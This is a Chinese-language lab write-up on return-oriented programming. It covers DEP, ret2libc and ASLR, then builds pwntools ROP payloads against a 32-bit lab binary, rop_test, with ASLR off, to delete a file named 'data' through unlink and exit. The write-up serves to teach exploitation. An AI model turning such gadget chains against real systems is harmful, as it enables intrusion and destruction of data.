本来以为 breakcananry 是第二部分，但是从参考论文提供的信息来看是需要用到 ROP 的大作业性质的内容，于是就从 ROP 继续了。
ROP 是还未涉足过的领域。为了对这种攻击有一个比较彻底的理解而不是仅会做题，我们先从论文出发，追本溯源。
## 缓冲区溢出的攻与防
最早的栈溢出我们已经非常了解了，是利用了如 C 语言不存在数组边界检查的特点，按顺序覆写栈上的内容实现的流程控制权转移攻击。
### DEP
随着计算机结构的发展，现代机器上直接实现栈上代码注入和执行已经不可能了。现代处理器和操作系统能够将栈地址空间所在的虚拟内存页标记为不可执行，当攻击者尝试执行栈上的代码时，OS 就会抛出异常。
更彻底的做法是将页标记为执行（X）和写入（W）的异或，即特定虚拟内存页可写入和可执行二选一。这样在缓冲区上注入的代码永远也无法执行，缓冲区溢出就会失效。
### ret2libc
既然不能利用注入的代码，攻击者将目光转向用户进程中，例如代码段或是链接库中的函数代码。我们知道 C 标准库中加载了攻击者可以利用的函数，libc 就是常见的目标，这种攻击也称为 ret2libc 攻击。
但是 ret2libc 攻击的局限性更大：

1. ret2libc 攻击中，攻击者可以接连调用 libc 中的函数；但是这种代码的执行只能是直线式的，不如注入代码的灵活性高；
2. 攻击者只能利用进程代码段或者库中的可利用函数，例如 system。但是如果库中的函数被移除，那么攻击能力也会受到限制。
3. IA-32 中参数一般通过栈传递，因此 ret2libc 攻击非常奏效；而进入 x86_64 之后，参数大多通过寄存器传递，即使是 libc 中的函数调用也难以实现了。
### ASLR
ASLR（Address Space Layout Randomization）是一种防御缓冲区溢出的机制，ASLR 也是用来抵抗缓冲区溢出攻击的机制，将进程空间的代码和数据地址随机化实现防御。
为了防御 ret2libc 攻击，ASLR 一般将库链接的代码地址随机化处理，但也有对整个地址空间随机化的。
但是 ASLR 也存在一些局限性。在 32 位平台上，ASLR 的随机化位数有限，暴力破解是可行的；64 位下，可随机化的位数更多，暴力破解不可行。但是如果产生了内存信息泄露，ASLR 仍可能被破解，例如格式化字符串漏洞。
### 目前的缓冲区溢出
当代大部分操作系统下，堆栈不可执行和 ASLR 已经是很普遍的设定了，在这样的情况下，攻击者再想要利用缓冲区溢出，就至少要满足两个条件：

- 为了破解堆栈不可执行，攻击者必须找到合适的 gadget；
- 为了破解 ASLR，攻击者必须解决地址随机化的迷惑，定位代码段的位置。

在 32 位平台上，以上两个问题已经有简单的暴力破解方法了。特别是 ASLR，在 32 位平台上的防御性能有限；但是在 64 位平台上，也存在一定可能性：

- 通过存在漏洞的代码泄露代码段的地址信息。
- 多次执行中加载地址相同的代码是可以利用的。例如 Linux 上可执行文件的代码尽管开了 ASLR，仍然会被加载到固定的地址，而动态库和其他数据内存区被随机化处理。
- 一些平台例如 Windows，共享库和一些不可用 ASLR 的库都会被映射到静态地址。
## ROP 总述
ROP 的思想是如何来的呢？我们要回到 ret2libc。
ret2libc 攻击利用的是 libc 中的动态链接的库函数，但是从理论上讲，无论是用户代码段还是链接的库中的代码，都可以作为攻击代码的一部分，ROP 正是出于这样的考虑。
ROP 为了绕过堆栈不可执行，利用小块的加载到地址空间中的用户代码进行攻击，利用的小片代码称为 gadget——将特定的 gadget 按特定顺序组合以生成 shell。
例如生成 shell 之前将 stdin、stdout、stderr 定位到某个套接字，在代码上表示为：
`dup2(s,0);`
`dup2(s,1);`
`dup2(s,2);`
`execve("/bin/sh",0,0);`
但是如果用多个 gadget 串起来执行，就是像下面这样：
![gadget.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1718722613859-be391913-a071-4edd-8405-37ebf80bf923.png#averageHue=%23ededed&clientId=u32563586-859c-4&from=ui&height=288&id=ubc44c77b&originHeight=288&originWidth=612&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17731&status=done&style=none&taskId=u52f20a86-6d49-448a-aa5c-4ff4b41001b&title=&width=612)
不同的操作通过不断的 return 接连执行，随后生成一个 shell。
实际操作中，ROP gadget 通常是有一短串机器指令组成的，每一组指令以 return 结尾，方便运行下一个 gadget。又因为 x86_64 下的系统调用 API 传参使用 rdi、rsi 为前两个实参，rax 保存调用号。更改寄存器的值可以将值存在栈上，通过 pop 指令修改指定寄存器的值。如下图所示：
![argument.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1718722874454-d98c45d8-ff4b-4615-ad94-5f67603a5f6d.png#averageHue=%23f0f0f0&clientId=u32563586-859c-4&from=ui&id=ue80a0503&originHeight=285&originWidth=603&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15046&status=done&style=none&taskId=ufc258f3d-8f44-4172-af91-f52b69370e6&title=)
所以我们可以看出，ROP 攻击不没有产生实际的函数调用，因此从 libc 中移除 system 函数也无济于事，这是 ROP 攻击的优势。
但是 ROP 攻击也有一些缺点，在 x86_64 平台上缺点更明显。
由于 x86_64 中参数通过大多通过寄存器传递，因此 ROP 攻击需要向特定寄存器中存特定值的 gadget。所以可以说 ROP 攻击的复杂度更高。
除了 ASLR 和上述问题外，在 x86_64 平台上由于虚拟地址仅有 48 位，用户级指针指向的地址必然包含 0 字节。这些 0 会导致依赖于字符串操作（例如 strcpy）导致的溢出攻击提前终止，这是另外的难点。
## 实验进行
### 确定漏洞利用
本实验的目标是通过目标程序中存在的缓冲区溢出漏洞，利用 ROP 攻击调用 unlink 封装函数达到删除当前文件夹下名为 data 的文件的目的，然后调用 exit 正常返回。
通过本实验，可以学习到 ROP 攻击的基本原理，而且能够应对含有副作用的 gadget。
注意，本实验需要关闭 ASLR。
首先用 checksec 查一下，本实验没有开启 StackGuard，但是有堆栈不可执行，所以可以用修改返回地址的方法进行 getshell。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1718874328139-7b0c1595-f317-4282-a617-ac62973d334d.png#averageHue=%2389888f&clientId=ub0d648ea-1089-4&from=paste&height=116&id=ufc44e938&originHeight=116&originWidth=327&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23663&status=done&style=none&taskId=ucce68272-01f9-4a5b-afac-8f678fdc9c6&title=&width=327)
本实验是没有源代码的，我们只好通过 objdump 来看看反汇编信息：
![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1718875243320-52b045c1-229b-4384-877e-d50fef0a6dc8.png#averageHue=%23888990&clientId=ub0d648ea-1089-4&from=paste&height=247&id=uaf97f71d&originHeight=247&originWidth=694&originalType=binary&ratio=1&rotation=0&showTitle=false&size=98261&status=done&style=none&taskId=u5b1a3aa4-8a98-481b-a922-f0c9274bd70&title=&width=694)
可以看到有非常明显可以利用的函数 strcpy，vul 函数名也在暗示我们这个函数存在漏洞，那么漏洞的位置可以确定了。
### 删除目的实现
既然可以确定利用 ROP 进行缓冲区溢出攻击，那么下一步我们需要知道如何达到实验目的，之后才能找相应的 gadget。
在本实验中需要的用到的封装函数是文件删除的 unlink 函数和 exit 退出，其原型为：

| 名称 | 原型 | 调用号 | 传参寄存器 |
| --- | --- | --- | --- |
| unlink | int unlink(const char* pathname); | 0x0a | ebx |
| exit | void exit(int error_code); | 0x01 | ebx |

本实验需要穿的参数只有一个也就是 ebx，所以寻找 gadget 并不困难。
我们需要将 eax 设为调用号，ebx 设为对应参数，而这些值都必须在栈上，也就是从存在漏洞的缓冲区传进去。
那么，我们可以将 gadget 在栈上的排布表示为：
![](https://cdn.nlark.com/yuque/0/2024/jpeg/43291115/1718879226674-e71eb835-2609-4db6-9666-24b5ff102f81.jpeg)
由于 StackGuard 没有开启，我们可以将返回地址覆写为 gadget1 入口，那么：

1. 函数执行到 ret 指令时，函数跋已经完成，esp 指向的地方是原返回地址，现在被覆写为 gadget1 入口地址；
2. ret 执行，程序跳转到 gadget1，将栈上的 0x0a 赋给 eax；esp 再指向 gadget2 的入口地址；
3. 第二条 ret，此时 esp 指向的内容是 gadget2 入口地址，于是 ret 执行时跳转到 gadget2 内；
4. pop ebx 将 ebx 赋为需要删除的文件名 data 所在的地址，由于关闭了 ASLR 所以是固定位置。之后 esp 再自增；
5. 第三条 ret 执行，准备处理下一个操作。

所以我们可以将两次系统调用的封装 unlink 和 exit，以上述方法串起来。 
### 程序流程分析
在进行 gadget 链构造之前，我们首先要确定缓冲区到返回地址的偏移，这一步我们已经比较熟悉了。
但是在这之前，我们需要分析一下程序流，知道我们的 payload 是如何读取进去的。
这一步可以用 IDA Pro 看看反编译静态分析，也可以尝试构造输入然后动态调试。这里我的建议是两种结合起来用，特别是动态分析，这是一定要熟练的技能。
我是先用了 pwndbg 调试，发现程序需要读入一个文件，然后在 vul 函数中将文件内容写入到缓冲区。所以我们需要判断的是 vul 函数中缓冲区到返回地址的偏移。
注意带命令行参数的 gdb 是在弹出提示符之后使用 `set args v1 v2 v3 ...` 来设定的。
 ![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1718897188559-9ff7f0a8-d42d-4912-95cc-cd247768a981.png#averageHue=%232a363d&clientId=ue85ca0cd-9a1e-4&from=paste&height=628&id=u6541b463&originHeight=628&originWidth=1018&originalType=binary&ratio=1&rotation=0&showTitle=false&size=659300&status=done&style=none&taskId=u922cf090-52b1-4288-b3d0-e2417e09b92&title=&width=1018)
可以发现 ebp = 0xffffbc28，strcpy 的目的地址是 0xffffbbbc，所以可以计算出偏移 offset = 0x6c + 4 = 0x70。
之后再通过 IDA Pro 来验证我们对于程序流程的猜测：
![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1718897537503-9cefeaa5-8d37-4da7-9786-cea62bed6092.png#averageHue=%23517352&clientId=ue85ca0cd-9a1e-4&from=paste&height=1085&id=u8b0f7084&originHeight=1085&originWidth=1430&originalType=binary&ratio=1&rotation=0&showTitle=false&size=237712&status=done&style=none&taskId=u1ccc5427-67b7-48e1-a947-a16313e03e4&title=&width=1430)
与我们的猜测基本一致。
那么我们到这里可以确定，构造的 gadget 需要写入到命令行附带的文件中去，之后在 vul 函数中通过 strcpy 进行缓冲区溢出，覆盖返回地址，执行 gadget 指令串。下一步我们根据所得的信息开始构造 gadget 链。
### gadget 链构造
首先我们要先进行 unlink，需要对 eax 和 ebx 赋值，那么可以构造如下 gadget：
```python
offset = 0x70
p = b'a' * offset	# 填充
p += pop_eax		# pop eax; ret; 地址
p += 0xa			# unlink 调用号
p += pop_ebx		# pop ebx; ret; 地址
p += data_addr		# 'data' 字符串地址
p += int_0x80		# int 0x80 中断
```
但是由于在 strcpy 函数中，遇到 '\0'、'\n'、'\t' 会提前终止拷贝，因此 payload 中不能存在这些字符。
由于 0xa 可能被解释为整型数，表示为 `0a 00 00 00`，因此会导致 exploit 失败。
如果遇到这种情况，可以另外找一个自增 eax 的 gadget，先置为 0，之后一路增到 0xa。例如：
`inc eax; ret;`
最后是我们要达到的目的：删除 data 文件。所以我们需要让这个 "data" 字符串也一起加载到缓冲区去，这个字符串开始的地址可以通过缓冲区的起始地址计算偏移得到；可以自己构造额外数据段；也可直接到 libc 中去找到。
### gadget 查询
教程给出了两种方法：
第一种是手动搜索：利用 IDA 反汇编来确定使用的 gadget 在库中的地址。确定库文件之后用 IDA 打开，反汇编 libc.so.6，切换到 Hex View-A 视图，根据 gadget 机器码查找相应的 gadget 地址。以 `pop eax; ret;` 为例：

1. `ldd ./rop_test` 查询使用的 libc 库名为 libc.so.6；
2. 拷贝到主机，用 IDA Pro 打开；
3. 查询汇编指令对应的机器码为 58c3；
4. 进入 16 进制视图，查询对应字节码地址。

![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1718900848578-e7786a38-cff6-48b1-9176-13bf2b036845.png#averageHue=%23282725&clientId=ue85ca0cd-9a1e-4&from=paste&height=118&id=u7d15303e&originHeight=118&originWidth=579&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17188&status=done&style=none&taskId=u58a0a665-83c8-4acc-b19b-4898f94fade&title=&width=579)
可以发现对应的地址为 0x000b5aa5。
第二种方法是利用 ROPgadget 工具，指定库文件 libc.so.6 ，查询机器码 58c3：
`ROPgadget --binary /lib/i386-linux-gnu/libc.so.6 --opcode 58c3`
得到全部结果：
![屏幕截图 2024-06-21 002912.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1718900999539-f3270360-fc12-4dce-a8ed-91750beacee3.png#averageHue=%23566775&clientId=ue85ca0cd-9a1e-4&from=ui&id=u773f75a3&originHeight=152&originWidth=628&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74551&status=done&style=none&taskId=u94c240f9-0b6b-4275-949a-3e6e935be62&title=)
可以发现，两种方法都可以找到 0x000b5aa5 的指令。相对而言，手动查找比较麻烦，需要熟练使用 ROPgadget。
我们把所有需要用到的指令都找出来：
`ROPgadget--binaryrop--only'pop|ret'|grep'eax'`
![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1718988441288-5733591f-f541-4cdd-b144-7bca941626dc.png#averageHue=%2355573d&clientId=ub7e603b2-4361-4&from=paste&height=159&id=u59f8854f&originHeight=239&originWidth=1106&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=317000&status=done&style=none&taskId=ue3ba30ad-80b8-456f-91d9-dddfbf25854&title=&width=737.3333333333334)

| 汇编 | 机器码 | 相对库内地址 |
| --- | --- | --- |
| pop eax; ret; | 58c3 | 0x0002ed92 |
| pop ebx; ret; | 5bc3 | 0x0002c01f |

![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1718985676181-295cbe2b-4370-4864-896c-3704c5457653.png#averageHue=%2383868f&clientId=ub7e603b2-4361-4&from=paste&height=84&id=u842c0f9e&originHeight=126&originWidth=1051&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=86241&status=done&style=none&taskId=uff517f60-e03a-4d46-bdf3-33194ec00db&title=&width=700.6666666666666)
注意，libc 库中并不存在 `int 0x80; ret;` 指令。我们在可执行文件中找到了代替的 gadget。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1719048290823-303a600b-8a27-439b-b8d1-4a982f25bee9.png#averageHue=%2385868e&clientId=u1097f039-8b00-4&from=paste&height=287&id=u77368ed9&originHeight=431&originWidth=1102&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=231127&status=done&style=none&taskId=u4de98b59-1067-40cd-851e-4747c9dfc3f&title=&width=734.6666666666666)
定位在 0x08048623，但是也带来了副作用，需要额外的填充数据来保持堆栈平衡。
但是可执行文件找到不到 data 字符串，我们可以在 libc 中找到。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1719050106394-52d64480-4d8a-4209-9d8b-e9954492fd0f.png#averageHue=%237d7e86&clientId=u1097f039-8b00-4&from=paste&height=348&id=u1a99bd6e&originHeight=522&originWidth=1099&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=347934&status=done&style=none&taskId=ua18c3c74-8e1f-4a92-8413-7af2c088628&title=&width=732.6666666666666)
### payload 构造
综上，我们可以根据所有获得的信息开始构造 payload 了。
```python
from pwn import *
import struct 
buf_addr = 0xffffbbbc
ebp_addr = 0xffffbc28
libc_addr = 0xf7c00000

pop_eax = 0x0002ed92
pop_ebx = 0x0002c01f
data_addr = 0x00012a97

int_addr = 0x08048623 # int 0x80; pop eax; ret;

offset = ebp_addr - buf_addr + 0x4

stack_values = [
    libc_addr + pop_eax,
    0xa,
    libc_addr + pop_ebx,
    libc_addr + data_addr,
    0xffffffff, # padding
    int_addr,

    libc_addr + pop_eax,
    0x1,
    libc_addr + pop_ebx,
    0x1,
    0xffffffff,
    int_addr,
]

payload = b'a' * offset
for value in stack_values:
    payload += p32(value)

with open('payload','wb') as f:
    f.write(payload)
```
之后执行文件即可。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1719053136963-3c30c4bb-a19e-4c00-bfba-29ac3382d9cc.png#averageHue=%23e9e8e7&clientId=u1097f039-8b00-4&from=paste&height=411&id=u61ce07a1&originHeight=617&originWidth=1580&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=280766&status=done&style=none&taskId=ufcf608d9-b75e-400f-93b2-c970a3b921a&title=&width=1053.3333333333333)
没执行前还可以看到 data 文件在目录下，下面我们执行 rop_test。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1719058249305-91f7f297-b11d-46d9-8da8-8b4a31ed0c91.png#averageHue=%2383858e&clientId=uf1920686-3db5-4&from=paste&height=79&id=uf9206ae6&originHeight=119&originWidth=1105&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=65325&status=done&style=none&taskId=ub72af6e1-b21e-40ed-af0f-87994c42485&title=&width=736.6666666666666)
这里竟然出现了段错误，说明我们的 gadget 链执行出了异常。哪里出了问题呢？我们用 gdb 分析看看。
定位到 strcpy 发生之后，程序通过 ret 进入到了 gadget1：
![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1719058426524-02e9f896-9838-46dd-8289-eca82a8ee677.png#averageHue=%2385868e&clientId=uf1920686-3db5-4&from=paste&height=189&id=u014bee9a&originHeight=284&originWidth=1026&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=133690&status=done&style=none&taskId=u8e4ee2cc-d4cb-4104-89b3-31f20cd89b9&title=&width=684)
但是返回地址好像有一点问题，并不是我们设定的 gadget2 入口，说明 strcpy 存在异常。我们返回到缓冲区看看拷贝的情况。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1719058374557-97ce3125-c798-45f6-b899-5c4550b5caf3.png#averageHue=%23848791&clientId=uf1920686-3db5-4&from=paste&height=425&id=u34dba245&originHeight=638&originWidth=1055&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=552182&status=done&style=none&taskId=ua9c3c961-7f8e-43eb-827b-0e55b121f84&title=&width=703.3333333333334)
发现在填充之后，是 gadget1 的地址，到这里没有问题。但是之后 4 字节就不对劲了，原本应该是存储的调用号 0x0000000a，但是却变成了 0xffff000a。
根据我们之前的学习，应该是 strcpy 在进行拷贝时将前面的 0x00 识别为了 '\0'，导致了 strcpy 提前终止。所以后面的内容都是垃圾值了，ret 跳转也失败了。
所以我们只好再去寻找将 eax 置 0；让 eax 自增的 gadget。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1719059261104-5d57ae16-8ac5-4950-b3be-4157592b5a77.png#averageHue=%23888991&clientId=uf1920686-3db5-4&from=paste&height=64&id=ua23fea50&originHeight=96&originWidth=797&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=50684&status=done&style=none&taskId=u28fe3229-5034-4e5b-9720-38bf65333e5&title=&width=531.3333333333334)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1719059326958-e0d65946-d6e6-46c1-bbb5-e7dcba0859bb.png#averageHue=%23848690&clientId=uf1920686-3db5-4&from=paste&height=43&id=u27e6239e&originHeight=65&originWidth=449&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=26299&status=done&style=none&taskId=ube5f5c05-030b-4525-bc5c-6a37c2bfa76&title=&width=299.3333333333333)
最后在 libc 库里定位偏移量分别为 0x00034ec0，0x0002f7b5。 
修改完的 exploit 程序代码如下：
```python
from pwn import *
import struct 
buf_addr = 0xffffbbbc
ebp_addr = 0xffffbc28

libc_addr = 0xf7c00000

pop_eax = 0x0002ed92
pop_ebx = 0x0002c01f
xor_eax = 0x00034ec0
inc_eax = 0x0002f7b5
data_addr = 0x00012a97

int_addr = 0x08048623 # int 0x80; pop eax; ret;

offset = ebp_addr - buf_addr + 0x4

stack_values = [
    # libc_addr + pop_eax,
    libc_addr + xor_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + pop_ebx,
    data_addr,
    int_addr,
    0xffffffff, # padding

    # libc_addr + pop_eax,
    libc_addr + xor_eax,
    libc_addr + inc_eax,
    libc_addr + pop_ebx,
    0x11111111,
    int_addr,
    0xffffffff,
]

payload = b'a' * offset
for value in stack_values:
    payload += p32(value)

with open('payload','wb') as f:
    f.write(payload)
```
但是运行仍然除了问题，这一次是 ebx。由于之前的字符串匹配出现了部分匹配，这里的删除无法找到匹配的文件。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1719062019259-6969722e-10bd-4b7a-86fa-fa2b8a847c6e.png#averageHue=%2382838c&clientId=uf1920686-3db5-4&from=paste&height=41&id=u011a49ca&originHeight=61&originWidth=502&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=21293&status=done&style=none&taskId=ue3a44410-a2a9-4494-9a52-59ba8408726&title=&width=334.6666666666667)
如图所示，ebx 装载的地址指向字符串实际上是 data_setent。经过我们的查找，无论是目标程序或是 libc 都不存在 'data' 字符串。
预期一个接一个去尝试，不如我们直接在 payload 中构造一个，然后再计算偏移。
也可以用 mov 和 pop 指令将 data 写入数据段，这样方便计算地址。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1719062692570-56bec6a1-3745-4624-a279-312407775622.png#averageHue=%2394795e&clientId=uf1920686-3db5-4&from=paste&height=269&id=ua3365421&originHeight=403&originWidth=1092&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=327605&status=done&style=none&taskId=u5e54840a-df8f-4112-882a-efce6680f21&title=&width=728)
为了避免出现字符串空字符导致的拷贝终止，我们将 data 字符串放到 payload 最后。通过观察缓冲区的内容，我们发现，填写的 gadgets 总长度为 0xffffbc80 - 0xffffbc2c = 0x54 字节。所以 data 的地址就是：
`data_addr = buf_addr + offset + 0x54`
最后构造 payload 如下：
```python
from pwn import *
import struct 
buf_addr = 0xffffbbbc
ebp_addr = 0xffffbc28

libc_addr = 0xf7c00000

pop_eax = 0x0002ed92
pop_ebx = 0x0002c01f
xor_eax = 0x00034ec0
inc_eax = 0x0002f7b5


int_addr = 0x08048623 # int 0x80; pop eax; ret;

offset = ebp_addr - buf_addr + 0x4
data_addr = buf_addr + offset + 0x54

stack_values = [
    # libc_addr + pop_eax,
    libc_addr + xor_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + pop_ebx,
    data_addr,
    int_addr,
    0xffffffff, # padding

    # libc_addr + pop_eax,
    libc_addr + xor_eax,
    libc_addr + inc_eax,
    libc_addr + pop_ebx,
    0x11111111, # error_code，可以任意填
    int_addr,
    0xffffffff, # padding
]

payload = b'a' * offset
for value in stack_values:
    payload += p32(value)
payload += b'data'

with open('payload','wb') as f:
    f.write(payload)
```
接着我们执行程序，注意到这次 ebx 复制成功，int 0x80 中断恰好正要触发 unlink 调用。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1719063274494-209f9ba7-1b02-4ec3-addb-634553c182b8.png#averageHue=%23456f8d&clientId=uf1920686-3db5-4&from=paste&height=730&id=u89113aff&originHeight=1095&originWidth=1559&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=895432&status=done&style=none&taskId=u6db3b53d-a454-4f5e-b73a-91e182dc0e8&title=&width=1039.3333333333333)
让程序继续执行，我们发现路径下的 data 真的被删除了，而且进程正常结束，没有出现异常，证明我们的攻击是成功的。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1719063699868-33b94a6d-a165-4379-bf94-04e4ef29ef43.png#averageHue=%23627952&clientId=uf1920686-3db5-4&from=paste&height=709&id=u2ead1460&originHeight=1063&originWidth=1655&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=850357&status=done&style=none&taskId=u98ebe1e8-71aa-4408-a818-5b8fdab0320&title=&width=1103.3333333333333)
### data 字符串写入——数据段
这一小节，我们尝试将 data 字符串写入数据段实现和 ROP。
首先，我们通过一条指令分析程序数据段的位置：
`realelf32 -S rop_test`
![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1719064610693-afcd6fd6-fa46-45a7-900d-f6941c6f007a.png#averageHue=%237f828c&clientId=uf1920686-3db5-4&from=paste&height=90&id=udb7243f0&originHeight=135&originWidth=1212&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=174820&status=done&style=none&taskId=ua6174768-af22-4f63-97a2-e72fff10eef&title=&width=808)
可以看到 .data 也就是数据段了，起始地址为 0x804a030，属性为 WA，表示可写。
进行字符串写入通常使用 edx 寄存器记录数据段首地址，我们需要寻找相关 gadget。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1719064888862-20ac1997-5d18-49b6-ad76-4d84df96754e.png#averageHue=%237c7e87&clientId=uf1920686-3db5-4&from=paste&height=116&id=u6fe1c5c9&originHeight=174&originWidth=1687&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=219812&status=done&style=none&taskId=ua2167b7a-0bbd-446a-837d-47c3c38ef1e&title=&width=1124.6666666666667)
`pop edx; ret;`偏移为 0x00037375。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1719065161379-b05ebe3d-b838-4d92-9e53-d2f91a9f40cc.png#averageHue=%2383848d&clientId=uf1920686-3db5-4&from=paste&height=46&id=u35643d92&originHeight=69&originWidth=870&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=48633&status=done&style=none&taskId=uc08c87df-1d98-41d6-8e5e-4307fad3d98&title=&width=580)
`mov dword ptr [edx], eax; ret;`，偏移为 0x00080b62。
构造以下 exploit：
```python
from pwn import *
import struct 
buf_addr = 0xffffbbbc
ebp_addr = 0xffffbc28

libc_addr = 0xf7c00000

pop_eax = 0x0002ed92
pop_ebx = 0x0002c01f
xor_eax = 0x00034ec0
inc_eax = 0x0002f7b5

int_addr = 0x08048623 # int 0x80; pop eax; ret;

offset = ebp_addr - buf_addr + 0x4
data_addr = buf_addr + offset + 0x54

dataSeg = 0x804a030
pop_edx = 0x00037375
mov_edx_eax = 0x00080b62

stack_values = [
    # libc_addr + pop_eax,
    libc_addr + pop_edx, # 记录数据段起始
    dataSeg,
    libc_addr + pop_eax, # 存放 'data'
    b'data',
    libc_addr + mov_edx_eax, # 给数据段赋值 'data'

    libc_addr + pop_edx, # 跳到 4 字节后，添加一个空字符
    dataSeg + 4,
    libc_addr + xor_eax, # eax 置 0
    libc_addr + mov_edx_eax, # 添加一个零字节
    libc_addr + pop_ebx, # ebx 指向的是数据段起始，也是 'data' 所在
    dataSeg,

    libc_addr + xor_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    libc_addr + inc_eax,
    
    # data_addr,
    int_addr,
    0xffffffff, # padding

    # libc_addr + pop_eax,
    libc_addr + xor_eax,
    libc_addr + inc_eax,
    libc_addr + pop_ebx,
    0x11111111,
    int_addr,
    0xffffffff,
]

payload = b'a' * offset
for value in stack_values:
    try:
        payload += p32(value)
    except:
        payload += value
#payload += b'data'

with open('payload','wb') as f:
    f.write(payload)
```
现在我们再次尝试。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1719065794175-f3a2ab24-e8db-4e61-ac52-a849423bfcec.png#averageHue=%23687f62&clientId=uf1920686-3db5-4&from=paste&height=721&id=u07b17fda&originHeight=1081&originWidth=1775&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1240609&status=done&style=none&taskId=ue4dbadfd-501d-4e9c-890a-f41da2a4771&title=&width=1183.3333333333333)
注意下图中，我们同样成功调用了 unlink。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1719066259446-440bb38a-f89c-4155-a29c-73b8c894170a.png#averageHue=%2380828c&clientId=uf1920686-3db5-4&from=paste&height=643&id=u3a55671f&originHeight=964&originWidth=1484&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=687824&status=done&style=none&taskId=u9b5ac0ff-48ef-4f80-b53f-2372b698493&title=&width=989.3333333333334)
最后 data 文件被删除，程序正常退出，正如我们所料。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1719066347258-3a928182-52bd-493e-b4fe-255cc940c1c5.png#averageHue=%235d7c6a&clientId=uf1920686-3db5-4&from=paste&height=687&id=ud43d112c&originHeight=1031&originWidth=1731&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=914402&status=done&style=none&taskId=u60457ac7-cb2e-4930-a6a1-4a6019bd334&title=&width=1154)
## 参考文章

- [1] BITTAU A, BELAY A, MASHTIZADEH A, et al. Hacking Blind[C/OL]//2014 IEEE Symposium on Security and Privacy, San Jose, CA. 2014. [http://dx.doi.org/10.1109/sp.2014.22.](http://dx.doi.org/10.1109/sp.2014.22.) DOI:10.1109/sp.2014.22.
- [2] Shacham, Hovav. The geometry of innocent flesh on the bone: return-into-libc without function calls (on the x86)[C]: Proceedings of the 14th ACM Conference on Computer and Communications Security, New York, NY, USA: Association for Computing Machinery, 2007. [https://doi.org/10.1145/1315245.1315313](https://doi.org/10.1145/1315245.1315313) DOI:10.1145/1315245.1315313
- [https://blog.csdn.net/vigoto/article/details/52739089](https://blog.csdn.net/vigoto/article/details/52739089)
- [https://developer.aliyun.com/article/328269](https://developer.aliyun.com/article/328269)
- [https://cloud.tencent.com/developer/article/2309461](https://cloud.tencent.com/developer/article/2309461)
- [https://ericfu.me/rop-attack-example-under-32bit-os/](https://ericfu.me/rop-attack-example-under-32bit-os/)
- [https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2syscall)

